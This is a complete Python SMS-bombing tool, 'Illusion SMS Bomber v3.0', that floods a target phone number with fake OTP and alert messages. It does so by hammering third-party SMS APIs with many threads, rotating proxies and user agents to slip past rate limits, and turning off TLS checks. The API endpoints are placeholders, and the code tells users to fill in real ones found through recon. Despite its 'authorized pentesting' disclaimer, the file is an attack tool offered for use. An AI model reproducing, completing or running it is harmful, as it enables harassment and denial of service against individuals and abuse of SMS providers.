#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────
#  ILLUSION SMS BOMBER v3.0
#  Created by illuZX
#  For Authorized Security Testing Only
# ──────────────────────────────────────────────────────────

import os
import sys
import json
import time
import random
import string
import threading
import requests
import socket
import signal
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── Suppress SSL warnings ───
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ─── ANSI Colors ───
class Colors:
    RESET   = '\033[0m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    ITALIC  = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK   = '\033[5m'
    REVERSE = '\033[7m'
    
    BLACK   = '\033[30m'
    RED     = '\033[31m'
    GREEN   = '\033[32m'
    YELLOW  = '\033[33m'
    BLUE    = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN    = '\033[36m'
    WHITE   = '\033[37m'
    
    BGBLACK   = '\033[40m'
    BGRED     = '\033[41m'
    BGGREEN   = '\033[42m'
    BGYELLOW  = '\033[43m'
    BGBLUE    = '\033[44m'
    BGMAGENTA = '\033[45m'
    BGCYAN    = '\033[46m'
    BGWHITE   = '\033[47m'
    
    # Combinations
    RED_BOLD    = '\033[1;31m'
    GREEN_BOLD  = '\033[1;32m'
    YELLOW_BOLD = '\033[1;33m'
    BLUE_BOLD   = '\033[1;34m'
    MAGENTA_BOLD = '\033[1;35m'
    CYAN_BOLD   = '\033[1;36m'
    WHITE_BOLD  = '\033[1;37m'

C = Colors()

# ─── Banner ───
BANNER = f"""
{C.RED}{C.BOLD}╔══════════════════════════════════════════════════════════╗
║                                                          ║
║     {C.CYAN}████████╗██╗  ██╗███████╗    ██████╗ ██████╗ ███╗   ███╗{C.RED}     ║
║     {C.CYAN}╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██╔══██╗████╗ ████║{C.RED}     ║
║     {C.CYAN}   ██║   ███████║█████╗      ██████╔╝██████╔╝██╔████╔██║{C.RED}     ║
║     {C.CYAN}   ██║   ██╔══██║██╔══╝      ██╔══██╗██╔══██╗██║╚██╔╝██║{C.RED}     ║
║     {C.CYAN}   ██║   ██║  ██║███████╗    ██████╔╝██████╔╝██║ ╚═╝ ██║{C.RED}     ║
║     {C.CYAN}   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝{C.RED}     ║
║                                                          ║
║     {C.YELLOW}██╗██╗     ██╗     ██╗   ██╗███████╗██╗  ██╗{C.RED}              ║
║     {C.YELLOW}██║██║     ██║     ██║   ██║██╔════╝╚██╗██╔╝{C.RED}              ║
║     {C.YELLOW}██║██║     ██║     ██║   ██║███████╗ ╚███╔╝ {C.RED}              ║
║     {C.YELLOW}██║██║     ██║     ██║   ██║╚════██║ ██╔██╗ {C.RED}              ║
║     {C.YELLOW}██║███████╗███████╗╚██████╔╝███████║██╔╝ ██╗{C.RED}              ║
║     {C.YELLOW}╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝{C.RED}              ║
║                                                          ║
║     {C.GREEN}███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗{C.RED}  ║
║     {C.GREEN}██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║{C.RED}  ║
║     {C.GREEN}███████╗██╔████╔██║█████╗      ██████╔╝██║   ██║██╔████╔██║{C.RED}  ║
║     {C.GREEN}╚════██║██║╚██╔╝██║██╔══╝      ██╔══██╗██║   ██║██║╚██╔╝██║{C.RED}  ║
║     {C.GREEN}███████║██║ ╚═╝ ██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║{C.RED}  ║
║     {C.GREEN}╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝{C.RED}  ║
║                                                          ║
║     {C.MAGENTA}⚡ Advanced SMS Bombing Framework v3.0{C.RED}                    ║
║     {C.DIM}Created by illuZX | For Authorized Pentesting Only{C.RED}          ║
╚══════════════════════════════════════════════════════════╝{C.RESET}
"""

# ─── Configuration ───
CONFIG = {
    "default_threads": 15,
    "default_duration": 30,
    "timeout": 8,
    "max_retries": 3,
    "retry_delay": 0.5,
    "proxy_file": "proxies.txt",
    "api_file": "apis.json",
    "show_user_agent_rotation": True,
    "auto_save_report": True,
}

# ─── Statistics ───
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total_sent = 0
        self.total_failed = 0
        self.total_retried = 0
        self.api_success = {}
        self.api_fail = {}
        self.start_time = None
        self.running = True
    
    def increment_sent(self, api_name="unknown"):
        with self.lock:
            self.total_sent += 1
            self.api_success[api_name] = self.api_success.get(api_name, 0) + 1
    
    def increment_failed(self, api_name="unknown"):
        with self.lock:
            self.total_failed += 1
            self.api_fail[api_name] = self.api_fail.get(api_name, 0) + 1
    
    def increment_retried(self):
        with self.lock:
            self.total_retried += 1
    
    def get_success_rate(self):
        total = self.total_sent + self.total_failed
        if total == 0:
            return 0.0
        return round((self.total_sent / total) * 100, 2)
    
    def elapsed(self):
        if not self.start_time:
            return 0
        return int(time.time() - self.start_time)

# ─── Proxy Manager ───
class ProxyManager:
    def __init__(self, proxy_file=None):
        self.proxies = []
        self.index = 0
        self.lock = threading.Lock()
        if proxy_file and os.path.exists(proxy_file):
            self._load(proxy_file)
    
    def _load(self, filename):
        try:
            with open(filename, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"{C.GREEN}[✓] Loaded {len(self.proxies)} proxies from {filename}{C.RESET}")
        except Exception as e:
            print(f"{C.YELLOW}[!] Could not load proxies: {e}{C.RESET}")
    
    def get_proxy(self):
        if not self.proxies:
            return None
        with self.lock:
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    
    def add_proxy(self, proxy):
        with self.lock:
            self.proxies.append(proxy)

# ─── API Manager ───
class APIManager:
    def __init__(self, api_file=None):
        self.apis = self._get_default_apis()
        if api_file and os.path.exists(api_file):
            self._load_custom(api_file)
    
    def _get_default_apis(self):
        """Returns a dict of API endpoints for SMS sending.
        NOTE: These are template structures. You must populate with real endpoints
        discovered through OSINT/recon for your target region."""
        return [
            {
                "name": "api_sms_gateway_1",
                "enabled": True,
                "weight": 1,
                "method": "POST",
                "url": "https://example-sms-api.com/send",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
                "data_template": '{{"phone": "{target}", "message": "Your OTP is {otp}", "country_code": "{country}"}}',
                "success_keywords": ["success", "sent", "ok", "true"],
            },
            {
                "name": "api_sms_gateway_2",
                "enabled": True,
                "weight": 1,
                "method": "GET",
                "url": "https://another-sms-api.com/sendSMS",
                "headers": {},
                "params_template": 'phone={target}&msg=OTP:+{otp}',
                "success_keywords": ["200", "success"],
            },
        ]
    
    def _load_custom(self, filename):
        try:
            with open(filename, 'r') as f:
                custom = json.load(f)
                if isinstance(custom, list):
                    self.apis.extend(custom)
                    print(f"{C.GREEN}[✓] Loaded {len(custom)} custom APIs from {filename}{C.RESET}")
        except Exception as e:
            print(f"{C.YELLOW}[!] Could not load custom APIs: {e}{C.RESET}")
    
    def get_enabled_apis(self):
        return [api for api in self.apis if api.get("enabled", True)]

# ─── User Agent Rotator ───
class UserAgentRotator:
    def __init__(self):
        self.agents = [
            # Chrome on Android
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.159 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
            # iPhone Safari
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            # Chrome Desktop
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.201 Safari/537.36",
            # Firefox
            "Mozilla/5.0 (Android 14; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        ]
    
    def get(self):
        return random.choice(self.agents)

# ─── Network Utilities ───
class NetworkUtils:
    @staticmethod
    def check_internet():
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except OSError:
            return False
    
    @staticmethod
    def get_public_ip():
        try:
            r = requests.get("https://api.ipify.org?format=json", timeout=5)
            return r.json().get("ip", "unknown")
        except:
            return "unknown"

# ─── Payload Generator ───
class PayloadGenerator:
    @staticmethod
    def generate_otp(length=6):
        return ''.join(random.choices(string.digits, k=length))
    
    @staticmethod
    def generate_message(variant="otp"):
        messages = {
            "otp": [
                "Your OTP is {otp}. Valid for 5 minutes.",
                "{otp} is your verification code.",
                "Use {otp} to complete login.",
                "One-time password: {otp}",
                "Your login code: {otp}",
                "Verification code: {otp}. Do not share.",
                "OTP: {otp}. Expires in 5 min.",
                "{otp} - your confirmation code.",
            ],
            "alert": [
                "ALERT: Suspicious login attempt detected.",
                "Security alert: New device logged into your account.",
                "Your account password was changed successfully.",
                "2FA enabled for your account.",
                "New login from {ip} - was this you?",
            ],
            "promo": [
                "Congratulations! You've won a free prize!",
                "Your delivery is on its way. Track here:",
                "Special offer just for you - 50% off!",
                "Your subscription has been renewed.",
            ]
        }
        variants = messages.get(variant, messages["otp"])
        return random.choice(variants)

# ─── Main Bomber Engine ───
class IllusionBomber:
    def __init__(self):
        self.target = None
        self.country_code = None
        self.threads = CONFIG["default_threads"]
        self.duration = CONFIG["default_duration"]
        self.stats = Stats()
        self.proxy_manager = ProxyManager(CONFIG["proxy_file"])
        self.api_manager = APIManager(CONFIG["api_file"])
        self.user_agent = UserAgentRotator()
        self.payload_gen = PayloadGenerator()
        self.stop_flag = threading.Event()
        self.executor = None
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        self.clear_screen()
        print(BANNER)
    
    def print_status_bar(self):
        success_rate = self.stats.get_success_rate()
        elapsed = self.stats.elapsed()
        
        bar_width = 40
        filled = int((success_rate / 100) * bar_width)
        bar = f"{C.GREEN}{'█' * filled}{C.RED}{'░' * (bar_width - filled)}{C.RESET}"
        
        status = f"""
{C.CYAN}╔{'═' * 55}╗{C.RESET}
{C.CYAN}║{C.RESET} {C.WHITE_BOLD}TARGET    {C.RESET}: {C.YELLOW}{self.target:<20}{C.RESET}     {C.CYAN}║{C.RESET}
{C.CYAN}║{C.RESET} {C.WHITE_BOLD}ELAPSED   {C.RESET}: {C.YELLOW}{elapsed:<5}s{C.RESET}              {C.CYAN}║{C.RESET}
{C.CYAN}║{C.RESET} {C.WHITE_BOLD}THREADS   {C.RESET}: {C.YELLOW}{self.threads:<5}{C.RESET}              {C.CYAN}║{C.RESET}
{C.CYAN}║{C.RESET} {C.WHITE_BOLD}RUNNING   {C.RESET}: {C.GREEN if self.stats.running else C.RED}{'▶ ACTIVE' if self.stats.running else '■ STOPPED'}{C.RESET}         {C.CYAN}║{C.RESET}
{C.CYAN}╠{'═' * 55}╣{C.RESET}
{C.CYAN}║{C.RESET}  {C.GREEN}✓ SENT   : {C.GREEN_BOLD}{self.stats.total_sent:<8}{C.RESET}  {C.RED}✗ FAILED : {C.RED_BOLD}{self.stats.total_failed:<8}{C.RESET}  {C.CYAN}║{C.RESET}
{C.CYAN}║{C.RESET}  {C.YELLOW}⟳ RETRIES: {self.stats.total_retried:<8}{C.RESET}  {C.MAGENTA}📊 RATE   : {success_rate}%{C.RESET}  {C.CYAN}║{C.RESET}
{C.CYAN}║{C.RESET}  {bar}  {C.CYAN}║{C.RESET}
{C.CYAN}╚{'═' * 55}╝{C.RESET}
{C.DIM}Press Ctrl+C to stop gracefully{C.RESET}
"""
        sys.stdout.write(f"\033[{status.count(chr(10))+1}A")
        sys.stdout.write(status)
        sys.stdout.flush()
    
    def validate_phone(self, phone):
        """Validate and format phone number."""
        phone = phone.strip()
        if phone.startswith('+'):
            self.country_code = phone[:3] if len(phone) > 3 else phone
        elif phone.startswith('00'):
            self.country_code = phone[:4]
        else:
            # Assume local number, prompt for country code
            print(f"{C.YELLOW}[!] No country code detected.{C.RESET}")
            code = input(f"{C.CYAN}[?] Enter country code (e.g., 1 for US, 91 for India): {C.RESET}").strip()
            phone = f"+{code}{phone}"
            self.country_code = f"+{code}"
        
        # Basic validation
        digits = ''.join(c for c in phone if c.isdigit())
        if len(digits) < 10 or len(digits) > 15:
            print(f"{C.RED}[!] Invalid phone number length.{C.RESET}")
            return None
        return phone
    
    def setup_interactive(self):
        """Interactive setup menu."""
        self.print_banner()
        
        print(f"\n{C.CYAN_BOLD}⚡ INITIALIZING ILLUSION BOMBER...{C.RESET}\n")
        
        # Internet check
        print(f"{C.DIM}[*] Checking network connectivity...{C.RESET}", end="")
        if NetworkUtils.check_internet():
            ip = NetworkUtils.get_public_ip()
            print(f"\r{C.GREEN}[✓] Connected | IP: {ip}{C.RESET}")
        else:
            print(f"\r{C.RED}[✗] No internet connection!{C.RESET}")
            sys.exit(1)
        
        # Target phone
        while True:
            phone = input(f"\n{C.CYAN}[?] Target phone number (with +countrycode): {C.RESET}")
            validated = self.validate_phone(phone)
            if validated:
                self.target = validated
                break
            print(f"{C.RED}[!] Please enter a valid number.{C.RESET}")
        
        # Threads
        thread_input = input(f"{C.CYAN}[?] Threads (default {CONFIG['default_threads']}): {C.RESET}").strip()
        if thread_input.isdigit():
            self.threads = int(thread_input)
        
        # Duration
        dur_input = input(f"{C.CYAN}[?] Duration in seconds (default {CONFIG['default_duration']}): {C.RESET}").strip()
        if dur_input.isdigit():
            self.duration = int(dur_input)
        
        # Proxy
        use_proxy = input(f"{C.CYAN}[?] Use proxies? (y/N): {C.RESET}").strip().lower()
        if use_proxy == 'y':
            proxy_input = input(f"{C.CYAN}[?] Proxy file (default: {CONFIG['proxy_file']}): {C.RESET}").strip()
            if proxy_input:
                self.proxy_manager = ProxyManager(proxy_input)
            else:
                self.proxy_manager = ProxyManager(CONFIG["proxy_file"])
        
        # Summary
        print(f"\n{C.CYAN}╔{'═' * 50}╗{C.RESET}")
        print(f"{C.CYAN}║{C.RESET} {C.WHITE_BOLD}OPERATION SUMMARY{C.RESET}{' ' * 36}{C.CYAN}║{C.RESET}")
        print(f"{C.CYAN}║{'═' * 50}║{C.RESET}")
        print(f"{C.CYAN}║{C.RESET} Target      : {C.YELLOW}{self.target}{C.RESET}")
        print(f"{C.CYAN}║{C.RESET} Country     : {C.YELLOW}{self.country_code}{C.RESET}")
        print(f"{C.CYAN}║{C.RESET} Threads     : {C.YELLOW}{self.threads}{C.RESET}")
        print(f"{C.CYAN}║{C.RESET} Duration    : {C.YELLOW}{self.duration}s{C.RESET}")
        print(f"{C.CYAN}║{C.RESET} APIs loaded : {C.YELLOW}{len(self.api_manager.get_enabled_apis())}{C.RESET}")
        print(f"{C.CYAN}║{C.RESET} Proxies     : {C.YELLOW}{len(self.proxy_manager.proxies) if self.proxy_manager.proxies else 0}{C.RESET}")
        print(f"{C.CYAN}╚{'═' * 50}╝{C.RESET}")
        
        confirm = input(f"\n{C.RED_BOLD}[!] Launch attack? (y/N): {C.RESET}").strip().lower()
        return confirm == 'y'
    
    def make_request(self, api):
        """Send a single request to an API with full error handling."""
        if self.stop_flag.is_set():
            return None
        
        api_name = api.get("name", "unknown")
        
        for attempt in range(CONFIG["max_retries"] + 1):
            if self.stop_flag.is_set():
                return None
            
            try:
                # Build payload
                otp = self.payload_gen.generate_otp()
                message = self.payload_gen.generate_message("otp").format(otp=otp)
                
                headers = api.get("headers", {}).copy()
                headers["User-Agent"] = self.user_agent.get()
                
                # Add random delays
                time.sleep(random.uniform(0.05, 0.3))
                
                proxies = self.proxy_manager.get_proxy()
                
                if api["method"].upper() == "POST":
                    try:
                        data = json.loads(api.get("data_template", "{}").format(
                            target=self.target, otp=otp, country=self.country_code
                        ))
                    except:
                        data = {"phone": self.target, "message": message}
                    
                    r = requests.post(
                        api["url"],
                        json=data,
                        headers=headers,
                        proxies=proxies,
                        timeout=CONFIG["timeout"],
                        verify=False,
                    )
                else:
                    try:
                        params_str = api.get("params_template", "").format(
                            target=self.target, otp=otp, country=self.country_code
                        )
                        params = dict(param.split("=") for param in params_str.split("&"))
                    except:
                        params = {"phone": self.target, "msg": message}
                    
                    r = requests.get(
                        api["url"],
                        params=params,
                        headers=headers,
                        proxies=proxies,
                        timeout=CONFIG["timeout"],
                        verify=False,
                    )
                
                # Check response
                response_text = r.text.lower()
                success_keywords = api.get("success_keywords", ["success", "sent", "ok"])
                
                if any(kw in response_text for kw in success_keywords) or r.status_code == 200:
                    self.stats.increment_sent(api_name)
                    return True
                else:
                    self.stats.increment_failed(api_name)
                    return False
                    
            except requests.exceptions.Timeout:
                if attempt < CONFIG["max_retries"]:
                    self.stats.increment_retried()
                    time.sleep(CONFIG["retry_delay"] * (attempt + 1))
                    continue
                self.stats.increment_failed(api_name)
                
            except requests.exceptions.ConnectionError:
                if attempt < CONFIG["max_retries"]:
                    self.stats.increment_retried()
                    time.sleep(CONFIG["retry_delay"] * 2)
                    continue
                self.stats.increment_failed(api_name)
                
            except requests.exceptions.ProxyError:
                if attempt < CONFIG["max_retries"]:
                    self.stats.increment_retried()
                    # Try next proxy
                    continue
                self.stats.increment_failed(api_name)
                
            except Exception as e:
                if attempt < CONFIG["max_retries"]:
                    self.stats.increment_retried()
                    continue
                self.stats.increment_failed(api_name)
                
        return None
    
    def worker_loop(self, worker_id):
        """Worker thread: continuously sends requests to all APIs."""
        apis = self.api_manager.get_enabled_apis()
        if not apis:
            print(f"{C.RED}[!] No APIs configured!{C.RESET}")
            return
        
        while not self.stop_flag.is_set():
            for api in apis:
                if self.stop_flag.is_set():
                    break
                self.make_request(api)
                time.sleep(random.uniform(0.1, 0.5))
    
    def display_live_stats(self):
        """Display and refresh live statistics."""
        while self.stats.running and not self.stop_flag.is_set():
            self.print_status_bar()
            time.sleep(0.5)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully."""
        print(f"\n\n{C.YELLOW_BOLD}[!] Received interrupt signal. Shutting down gracefully...{C.RESET}")
        self.stop_flag.set()
    
    def save_report(self):
        """Save an HTML/JSON report of the operation."""
        if not CONFIG["auto_save_report"]:
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"illuzx_report_{timestamp}.json"
        
        report = {
            "tool": "Illusion SMS Bomber v3.0",
            "author": "illuZX",
            "timestamp": datetime.now().isoformat(),
            "target": self.target,
            "country_code": self.country_code,
            "threads": self.threads,
            "duration_seconds": self.duration,
            "results": {
                "total_sent": self.stats.total_sent,
                "total_failed": self.stats.total_failed,
                "total_retried": self.stats.total_retried,
                "success_rate": self.stats.get_success_rate(),
                "api_breakdown": {
                    "successful": {k: v for k, v in sorted(self.stats.api_success.items(), key=lambda x: x[1], reverse=True)},
                    "failed": {k: v for k, v in sorted(self.stats.api_fail.items(), key=lambda x: x[1], reverse=True)},
                }
            }
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"{C.GREEN}[✓] Report saved: {filename}{C.RESET}")
        except Exception as e:
            print(f"{C.YELLOW}[!] Could not save report: {e}{C.RESET}")
    
    def run(self):
        """Main entry point."""
        # Register signal handler
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # Interactive setup
        if not self.setup_interactive():
            print(f"\n{C.YELLOW}[!] Operation cancelled.{C.RESET}")
            return
        
        # ─── Launch Attack ───
        self.print_banner()
        print(f"\n{C.RED_BOLD}⚡ LAUNCHING ATTACK...{C.RESET}\n")
        
        self.stats.start_time = time.time()
        self.stats.running = True
        
        # Start workers
        workers = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker_loop, args=(i,), daemon=True)
            t.start()
            workers.append(t)
        
        # Start live stats display
        stats_thread = threading.Thread(target=self.display_live_stats, daemon=True)
        stats_thread.start()
        
        # Run for duration
        try:
            for remaining in range(self.duration, 0, -1):
                if self.stop_flag.is_set():
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        
        # Stop
        self.stop_flag.set()
        self.stats.running = False
        time.sleep(0.5)
        
        # Final display
        success_rate = self.stats.get_success_rate()
        
        print(f"\n{C.CYAN}{'═' * 55}{C.RESET}")
        print(f"{C.GREEN_BOLD}  ✓ OPERATION COMPLETED{C.RESET}")
        print(f"{C.CYAN}{'═' * 55}{C.RESET}")
        print(f"  {C.WHITE_BOLD}Total Sent  :{C.RESET} {C.GREEN_BOLD}{self.stats.total_sent}{C.RESET}")
        print(f"  {C.WHITE_BOLD}Total Failed:{C.RESET} {C.RED_BOLD}{self.stats.total_failed}{C.RESET}")
        print(f"  {C.WHITE_BOLD}Retries     :{C.RESET} {C.YELLOW}{self.stats.total_retried}{C.RESET}")
        print(f"  {C.WHITE_BOLD}Success Rate:{C.RESET} {C.GREEN if success_rate > 50 else C.YELLOW}{success_rate}%{C.RESET}")
        print(f"  {C.WHITE_BOLD}Elapsed     :{C.RESET} {self.stats.elapsed()}s")
        print(f"{C.CYAN}{'═' * 55}{C.RESET}")
        
        # Save report
        self.save_report()
        
        print(f"\n{C.DIM}Created by illuZX | Authorized Pentesting Only{C.RESET}\n")

# ─── Entry Point ───
if __name__ == "__main__":
    try:
        bomber = IllusionBomber()
        bomber.run()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[!] Exiting...{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}[✗] Fatal error: {e}{C.RESET}")
        sys.exit(1)
